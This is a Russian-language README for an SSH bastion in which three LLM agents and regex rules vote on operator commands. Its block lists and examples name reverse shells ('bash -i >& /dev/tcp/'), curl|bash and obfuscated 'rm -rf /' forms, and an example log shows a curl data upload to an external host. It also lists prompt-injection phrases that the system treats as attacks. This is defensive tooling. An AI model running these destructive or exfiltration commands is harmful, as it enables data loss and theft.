# 4SSH_CONTROL — Multi-Agent AI Defense SSH Bastion

SSH-бастион с принципом **«четырёх глаз»**, где роль второго администратора выполняют **три нейросетевых агента** с системой консенсусного голосования.

Каждая команда оператора проходит через четырёхслойный конвейер: мгновенные фильтры → контекстные правила → параллельная оценка тремя LLM-агентами → взвешенное голосование. Опасные команды блокируются, подозрительные — эскалируются на живого администратора, легитимные — выполняются без задержки.

Протестировано **336 тестами** (из них 8 раундов live-тестирования с реальным LLM), найдено и исправлено **28 уязвимостей**.

---

## Архитектура

```
Admin-1 ──SSH──► Bastion (:2222) ──SSH──► Target Server
                    │
                    ├──► Layer 0: Rule Engine              (< 1 мс)
                    │      ├── Whitelist (18 правил) → auto ALLOW
                    │      ├── Blacklist (49 паттернов) → auto DENY
                    │      ├── Sensitive Paths (16 путей) → DENY / ESCALATE
                    │      ├── Command Sanitization → нормализация обфускации
                    │      └── Command Chaining → разбор ; && || $() ``
                    │
                    ├──► Layer 1: Escalation Rules          (< 1 мс)
                    │      └── 115 контекстных regex → DENY / ESCALATE
                    │          (kill -9 1, mv /bin/*, systemctl stop, ...)
                    │
                    ├──► Layer 2: AI Agents                 (параллельно)
                    │      ├── Command Classifier  (классификация)
                    │      ├── Context Analyzer    (поведение в сессии)
                    │      └── Policy Enforcer     (RBAC + время)
                    │         └── Deterministic pre-check → denied_commands
                    │             не зависит от LLM, не обходится консенсусом
                    │
                    ├──► Layer 3: Consensus Engine
                    │      ├── ALLOW    → выполнить
                    │      ├── DENY     → заблокировать + алерт
                    │      └── ESCALATE → запросить Admin-2 + алерт
                    │
                    ├──► Rate Limiter (30 cmd/60s на сессию)
                    ├──► Audit Logger (SQLite + JSONL + retention 90 дней)
                    ├──► Alert Engine (Telegram / Webhook + SSRF-защита)
                    └──► Dashboard (http://127.0.0.1:8080)
```

---

## Слои защиты

### Layer 0 — Rule Engine

Мгновенный фильтр. Обрабатывает ~80% команд за < 1 мс без обращения к LLM.

- **Whitelist** (18 правил): `ls`, `pwd`, `whoami`, `date`, `uptime`, `df -h`, `ps aux`, `ip a` и др.
- **Blacklist** (49 паттернов): `rm -rf /`, fork bomb, `dd if=/dev/`, `mkfs`, `chmod 777`, `curl|bash`, `echo|bash`, `shutdown`, `reboot`, `iptables -F`, reverse shell, `history -c`, `shred`, `base64|bash`, `eval $(`, `python -c`, `perl -e`, `find -exec sh`, `xargs rm`, `find -delete`, `crontab -r`, `nohup`, `$IFS` и др.
- **Sensitive Paths** (16 путей): `/etc/shadow`, `/etc/sudoers`, `.ssh/authorized_keys`, `/etc/pam.d/`, `/etc/ld.so.preload` → DENY; `/etc/passwd`, `/etc/ssh/sshd_config`, `/etc/crontab` → ESCALATE
- **Dangerous Content** (14 паттернов): мониторинг ввода внутри интерактивных программ — reverse shell, SSH-ключи, `NOPASSWD`, `PermitRootLogin yes`, `LD_PRELOAD`, `socat`

#### Command Sanitization

Перед проверкой каждая команда проходит многоступенчатую нормализацию:

| Вектор обфускации | Пример | Нормализация |
|-------------------|--------|--------------|
| ANSI escape-коды | `\x1b[31mrm\x1b[0m -rf /` | `rm -rf /` |
| Unicode confusables | `rm \u2212rf /` (MINUS SIGN) | `rm -rf /` |
| ANSI-C quoting | `$'\x72\x6d' -rf /` | `rm -rf /` |
| Обфускация имени | `'r''m' -rf /`, `r\m -rf /` | `rm -rf /` |
| Развёртывание обёрток | `sudo env bash -c 'rm -rf /'` | `rm -rf /` |
| Нормализация путей | `cat /tmp/../../etc/shadow` | `cat /etc/shadow` |
| Нормализация флагов rm | `rm --recursive --force /` | `rm -rf /` |
| Цепочки команд | `ls ; rm -rf /` | каждая подкоманда отдельно |

Развёртывание обёрток: `sudo`, `doas`, `busybox`, `env`, `nice`, `ionice`, `timeout`, `command`, `exec`, `strace`, `ltrace`, `su -c`, `bash -c`, `sh -c`, `eval`, `chroot`.

### Layer 1 — Контекстные правила эскалации

115 правил. Не запрещают команды целиком, а анализируют **контекст использования** — аргументы и целевые объекты.

| Команда | Безопасно | Опасно | Действие |
|---------|-----------|--------|----------|
| `kill` | `kill 12345` | `kill -9 1` — крэш init | DENY |
| `kill` | `kill -HUP 5432` | `killall sshd` | DENY |
| `mv` | `mv file.txt backup/` | `mv /bin/bash /tmp/` | DENY |
| `chmod` | `chmod 644 file` | `chmod u+s`, `chmod 4755` (SUID) | DENY |
| `systemctl` | `status`, `restart` | `stop`, `disable`, `mask` | ESCALATE |
| `ssh` | `ssh user@server` | `ssh -L`, `-R`, `-D` — туннели | ESCALATE |
| `kubectl` | `get`, `logs`, `describe` | `delete`, `drain`, `cordon` | ESCALATE |
| `docker` | `ps`, `logs` | `run --privileged` | ESCALATE |
| `tee` | `tee /tmp/out.txt` | `tee -a /etc/hosts` | ESCALATE |
| `sed` | `sed 's/a/b/' file` | `sed -i ... /etc/` | ESCALATE |
| `strace` | — | `strace -p 1234` | ESCALATE |
| `tcpdump` | — | `tcpdump -i eth0` | ESCALATE |
| `mount` | — | `mount /dev/sda1 /mnt` | ESCALATE |
| `export` | `export PATH=...` | `export LD_PRELOAD=...` | DENY |
| `alias` | `alias ll='ls -la'` | `alias sudo='echo pwned'` | DENY |
| `insmod` | — | загрузка модуля ядра | ESCALATE |
| `nmap` | — | сканирование сети | ESCALATE |
| `gcc/make` | — | компиляция кода на сервере | ESCALATE |
| `echo\|bash` | — | pipe к shell | DENY |

### Layer 2 — AI-агенты

Три LLM-агента работают **параллельно** для команд, не пойманных правилами.

**Agent 1 — Command Classifier.** Классификация одиночной команды: `safe`, `risky`, `destructive`, `recon`, `exfil`, `privesc`. Содержит конкретные примеры опасных паттернов и защиту от prompt injection.

**Agent 2 — Context Analyzer.** Анализирует **цепочку команд** в рамках сессии — ищет поведенческие паттерны:
- Разведка перед атакой: `ls` → `find` → `cat /etc/passwd`
- Эксфильтрация: `cat secret` → `base64` → `curl`
- Сокрытие следов: `history -c`, `cat /dev/null > /var/log/`
- Lateral movement: SSH-туннели, `scp`/`rsync` к другим хостам
- Privilege escalation: `whoami` → `sudo -l` → `sudo su`
- Многоэтапная RCE: `wget -O /tmp/x.sh` → `chmod +x` → `/tmp/x.sh`

**Agent 3 — Policy Enforcer.** RBAC + временные политики:
- **Deterministic pre-check** — `denied_commands` проверяются строго **до** обращения к LLM. Результат не может быть переопределён консенсусом агентов.
- 4 роли (`dev`, `ops`, `dba`, `neteng`) с раздельными allow/deny списками
- Нерабочие часы (22:00–06:00) → автоматическое повышение severity
- Развёртывание обёрток (`sudo rm` → проверяется `rm`, а не `sudo`)

Все агенты устойчивы к невалидным ответам LLM — при получении неизвестных значений verdict/category/severity происходит graceful fallback на ESCALATE/UNKNOWN/MEDIUM вместо крэша.

Защита от **prompt injection** — конструкции вроде «Ignore previous instructions» или «You are now...» в тексте команды автоматически расцениваются как атака.

### Layer 3 — Consensus Engine

Агрегация решений трёх агентов через взвешенное голосование:

| Агент | Вес | Почему |
|-------|-----|--------|
| Command Classifier | 1.0 | Базовая оценка |
| Context Analyzer | 1.5 | Видит всю сессию — больший авторитет |
| Policy Enforcer | 1.2 | Формальные политики RBAC |

Три стратегии (настраивается в `config.yaml`):
- **weighted_majority** — deny при превышении порога (по умолчанию 50%)
- **unanimous** — deny при любом несогласии
- **any_deny** — один deny = блокировка

При разногласии агентов команда **эскалируется** на Admin-2. Если `escalate_on_disagreement: false` — при разногласии разрешается (менее безопасно).

Неизвестные стратегии в конфиге логируются как warning и переключаются на `weighted_majority`.

---

## Интерактивные сессии

При запуске интерактивных программ (`vim`, `nano`, `ssh`, `python`, `mysql`, `docker exec -it`, `tmux`, `screen`, `man`, `mc`, `ranger`, `journalctl` и др.) бастион переключается в **passthrough-режим**:

1. Команда запуска проходит полный анализ (Layer 0–3)
2. После одобрения — прямой проброс ввода/вывода к целевому серверу
3. **Фоновый мониторинг**: каждые 32 символа ввод проверяется через `dangerous_content` — reverse shell, SSH-ключи, `sudoers`, `LD_PRELOAD` и т.п.
4. Возврат к shell-промпту определяется эвристикой (с фильтрацией REPL-промптов Python, MySQL, IPython)
5. `vim /etc/shadow` заблокируется **до** входа в программу

---

## Безопасность каналов

Бастион принимает **только session-каналы**. Попытки открыть `forwarded-tcpip`, `direct-tcpip` и другие типы каналов (SSH port forwarding) отклоняются с `OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED`.

---

## Rate Limiting

- **30 команд за 60 секунд** на сессию (скользящее окно)
- При превышении — мгновенный DENY без обращения к агентам
- Автоматическая очистка при завершении сессии (нет утечки памяти)

---

## Аудит и алерты

### Audit Logger
- **SQLite** (`audit.db`) — структурированный аудит с индексами по времени, сессии, вердикту
- **JSONL** (`audit.jsonl`) — append-only лог для SIEM (Elasticsearch, Splunk, Grafana Loki)
- Потокобезопасная запись (`threading.Lock`)
- **Retention policy**: автоматическая очистка записей старше `retention_days` (по умолчанию 90) при запуске

### Alert Engine
- **Telegram Bot** — уведомления с HTML-форматированием и экранированием спецсимволов
- **Webhook** — Slack, PagerDuty, MS Teams и любые HTTP-интеграции
- Алерты при **DENY и ESCALATE** на всех слоях (включая Layer 0)
- **SSRF-защита**: блокировка webhook-запросов к private IP (localhost, 10.x, 172.16-31.x, 192.168.x, 169.254.x)

### Dashboard
Веб-панель мониторинга на FastAPI (`http://127.0.0.1:8080`):
- Карточки: всего команд, разрешено, заблокировано, эскалаций, high/critical severity, сессий
- Таблица событий с автообновлением (15 сек)
- HTML-экранирование всего пользовательского ввода (защита от XSS)
- API: `/api/stats`, `/api/logs`, `/api/session/{id}`
- Swagger/ReDoc отключены

---

## Быстрый старт

### 1. Установка зависимостей

```bash
pip install -r requirements.txt
```

### 2. Настройка LLM

Для **Ollama** (локально, бесплатно):

```bash
ollama pull qwen2.5:7b
```

```yaml
llm:
  provider: "ollama"
  model: "qwen2.5:7b"
  api_key: ""
  base_url: "http://localhost:11434/v1"
  temperature: 0.1
  timeout: 120
```

Для **OpenAI**:

```yaml
llm:
  provider: "openai"
  model: "gpt-4o-mini"
  api_key: "sk-..."           # или переменная OPENAI_API_KEY
  base_url: ""
  temperature: 0.1
  timeout: 10
```

### 3. Запуск бастиона

```bash
python3 bastion.py --host <TARGET_IP> --user <USER> --password <PASS>
```

### 4. Запуск дашборда (в отдельном терминале)

```bash
python3 dashboard.py
```

### 5. Подключение оператора (Admin-1)

```bash
ssh anyuser@<BASTION_IP> -p 2222
```

---

## Аргументы CLI

| Аргумент | По умолчанию | Описание |
|----------|-------------|----------|
| `--host` | (обязательно) | IP целевого сервера |
| `--user` | (обязательно) | Логин на целевом сервере |
| `--password` | (обязательно) | Пароль на целевом сервере |
| `--port` | `22` | Порт SSH цели |
| `--listen` | `2222` | Порт бастиона |
| `--config` | `config.yaml` | Путь к конфигурации |
| `--role` | `ops` | Роль по умолчанию для пользователей без маппинга |

Все параметры можно задать и через `config.yaml` в секции `bastion:`.

---

## Конфигурация (`config.yaml`)

### LLM

```yaml
llm:
  provider: "openai"        # openai | ollama
  model: "gpt-4o-mini"
  api_key: ""
  base_url: ""              # для Ollama: http://localhost:11434/v1
  temperature: 0.1
  timeout: 10               # секунд (для Ollama рекомендуется 120)
```

### Агенты

```yaml
agents:
  command_classifier:
    enabled: true
    weight: 1.0
  context_analyzer:
    enabled: true
    weight: 1.5
    max_history: 50          # команд в истории сессии
  policy_enforcer:
    enabled: true
    weight: 1.2
```

### Консенсус

```yaml
consensus:
  strategy: "weighted_majority"   # weighted_majority | unanimous | any_deny
  deny_threshold: 0.5
  escalate_on_disagreement: true  # false = при разногласии → ALLOW
```

### Правила (rules)

```yaml
rules:
  whitelist:                 # мгновенный ALLOW
    - "ls"
    - "pwd"
    - "whoami"

  blacklist:                 # мгновенный DENY (regex)
    - pattern: "rm\\s+-rf\\s+/"
      reason: "Рекурсивное удаление от корня"
      severity: "critical"

  escalation_rules:          # контекстная эскалация (regex)
    - pattern: "kill\\s+.*\\b1\\b"
      reason: "kill PID 1"
      severity: "critical"
      action: "deny"         # deny | escalate
    - pattern: "systemctl\\s+(stop|disable|mask)\\s+"
      reason: "Остановка сервиса"
      severity: "high"
      action: "escalate"

  sensitive_paths:
    - pattern: "/etc/shadow"
      severity: "critical"
      action: "deny"
      reason: "Файл хешей паролей"

  dangerous_content:         # мониторинг ввода в интерактивных сессиях
    - pattern: "bash -i >& /dev/tcp/"
      reason: "Reverse shell"
      severity: "critical"
```

### RBAC

```yaml
rbac:
  roles:
    dev:
      description: "Разработчик"
      allowed_commands: ["ls", "cat", "grep", "tail", "git", "docker logs", "kubectl get"]
      denied_commands: ["rm", "systemctl", "chmod", "iptables"]
    ops:
      description: "Системный администратор"
      allowed_commands: ["*"]
      denied_commands: ["rm -rf /"]
    dba:
      description: "Администратор БД"
      allowed_commands: ["psql", "mysql", "mongosh", "redis-cli", "pg_dump"]
      denied_commands: ["rm", "systemctl", "useradd"]
    neteng:
      description: "Сетевой инженер"
      allowed_commands: ["ip", "ping", "traceroute", "netstat", "tcpdump", "nmap", "dig"]
      denied_commands: ["rm", "useradd", "passwd"]
  users:
    admin:
      role: "ops"
    dev_user:
      role: "dev"
  time_policy:
    high_risk_hours:
      start: "22:00"
      end: "06:00"
      timezone: "Europe/Moscow"
      action: "escalate"
```

### Алерты

```yaml
alerts:
  telegram:
    enabled: true
    bot_token: "123456:ABC..."
    chat_id: "-100123456789"
  webhook:
    enabled: true
    url: "https://hooks.slack.com/services/..."
```

### Аудит

```yaml
audit:
  db_path: "audit.db"
  json_log: "audit.jsonl"
  retention_days: 90         # автоочистка при запуске
```

---

## Примеры работы

### Безопасная команда (whitelist)

```
Admin-1: ls -la

[AI] Команда: ls -la
  ├─ rule_engine: ALLOW (100%) [low] Базовая команда 'ls' в белом списке
  └─ Итог: ALLOW (0ms)
```

### Жёсткий блок (blacklist)

```
Admin-1: rm -rf /

[AI] Команда: rm -rf /
  ├─ rule_engine: DENY (100%) [critical] Рекурсивное удаление от корня
  └─ Итог: DENY (0ms)

[AI DEFENSE] КОМАНДА ЗАБЛОКИРОВАНА
```

### Обфускация → нормализация → блок

```
Admin-1: sudo env $'\x72\x6d' --recursive --force /

[AI] Команда: (sanitized → rm -rf /)
  ├─ rule_engine: DENY (100%) [critical] Рекурсивное удаление от корня
  └─ Итог: DENY (0ms)
```

### Контекстная эскалация

```
Admin-1: systemctl stop nginx

[AI] Команда: systemctl stop nginx
  ├─ rule_engine: ESCALATE (100%) [high] Остановка/отключение сервиса
  └─ Итог: ESCALATE (0ms)

╔═══ ЭСКАЛАЦИЯ ═══════════════════════════════════════════╗
║ AI не уверен. Требуется решение Admin-2.                ║
║ Команда: systemctl stop nginx                           ║
╚═════════════════════════════════════════════════════════╝
[ЭСКАЛАЦИЯ] Разрешить? [y/n]:
```

### RBAC: детерминированный блок

```
(user: dev_user, role: dev)
Admin-1: rm /tmp/test.txt

[AI] Команда: rm /tmp/test.txt
  ├─ policy_enforcer: DENY (100%) [high] RBAC: команда 'rm' запрещена для роли
  └─ Итог: DENY (0ms)
```

### Полный AI-анализ (все 3 агента)

```
Admin-1: curl -d @/tmp/data.csv https://external.com/upload

[AI] Команда: curl -d @/tmp/data.csv https://external.com/upload
  ├─ command_classifier: DENY (88%) [high] Утечка данных наружу
  │  ⏱ 1200ms
  ├─ context_analyzer: DENY (92%) [high] [Паттерн: data_exfiltration]
  │  ⏱ 1500ms
  ├─ policy_enforcer: ESCALATE (60%) [medium] Не в списке разрешённых
  │  ⏱ 1100ms
  └─ Итог: DENY (1502ms)
```

---

## Структура проекта

```
4SSH_CONTROL/
├── bastion.py                       # Главный бастион с AI-защитой
├── dashboard.py                     # Запуск веб-дашборда
├── config.yaml                      # Конфигурация всей системы
├── requirements.txt                 # Зависимости Python
├── ai_defense/
│   ├── agents/
│   │   ├── command_classifier.py    # Agent 1: классификация команд
│   │   ├── context_analyzer.py      # Agent 2: контекст сессии
│   │   └── policy_enforcer.py       # Agent 3: RBAC + политики
│   ├── core/
│   │   ├── config.py                # Загрузка и парсинг config.yaml
│   │   ├── models.py                # Verdict, Session, AgentDecision
│   │   ├── rule_engine.py           # Layer 0 + Layer 1 (rules + sanitization)
│   │   ├── llm_client.py            # Клиент OpenAI / Ollama
│   │   ├── consensus.py             # Взвешенное голосование агентов
│   │   ├── engine.py                # AI Engine (оркестратор + rate limiter)
│   │   ├── audit.py                 # SQLite + JSONL аудит + retention
│   │   └── alerts.py                # Telegram + webhook + SSRF-защита
│   └── web/
│       └── dashboard.py             # FastAPI веб-панель
├── main.py                          # (Legacy) Ручной контроль Admin-2
├── secmain.py                       # (Legacy) Двойной интерактивный контроль
└── Схема PoC.md                     # Описание оригинальной концепции
```

---

## Результаты тестирования

Проект прошёл 8 раундов тестирования, включая live-тесты с реальным Ollama `qwen2.5:7b`:

| Раунд | Тесты | Пройдено | Найдено багов |
|-------|-------|----------|---------------|
| Системный аудит (модули) | 42 | 42/42 | 1 |
| Системный аудит (архитектура) | 70 | 70/70 | 2 |
| Финальный аудит (edge-кейсы) | 61 | 61/61 | 3 |
| Live-тесты v1 (реальный LLM) | 41 | 41/41 | 4 |
| Live-тесты v2 (RBAC, GTFOBins) | 52 | 52/52 | 3 |
| Пробелы покрытия | 24 | 24/24 | 6 |
| Финальная верификация | 12 | 12/12 | 5 |
| Глубокий тест (production-сценарии) | 34 | 34/34 | 4 |
| **Всего** | **336** | **336/336** | **28** |

Ключевые категории протестированных сценариев:
- 200+ атакующих векторов (GTFOBins, `$IFS`, heredoc, process substitution, encoding tricks)
- Prompt injection в 8 вариациях
- RBAC для всех 4 ролей через LLM
- Race conditions (10 параллельных сессий)
- LLM degradation и нагрузочное тестирование
- ReDoS-устойчивость (9 патологических паттернов)
- XSS, SQL injection, SSRF на dashboard и alert engine

---

## Legacy-скрипты

Оригинальные скрипты с ручным контролем (до внедрения AI):

- **`main.py`** — Admin-2 вручную подтверждает/отклоняет каждую команду (`y`/`n`)
- **`secmain.py`** — то же + Admin-2 может вводить команды напрямую в сессию

```bash
python3 main.py --host <TARGET_IP> --user <USER> --password <PASS>
python3 secmain.py --host <TARGET_IP> --user <USER> --password <PASS>
```

---

## Требования

- Python 3.10+
- Зависимости: `paramiko`, `openai`, `pyyaml`, `fastapi`, `uvicorn`, `aiohttp`, `aiosqlite`, `jinja2`
- Для LLM: API-ключ OpenAI **или** локальный [Ollama](https://ollama.ai)
- Целевой сервер с SSH-доступом
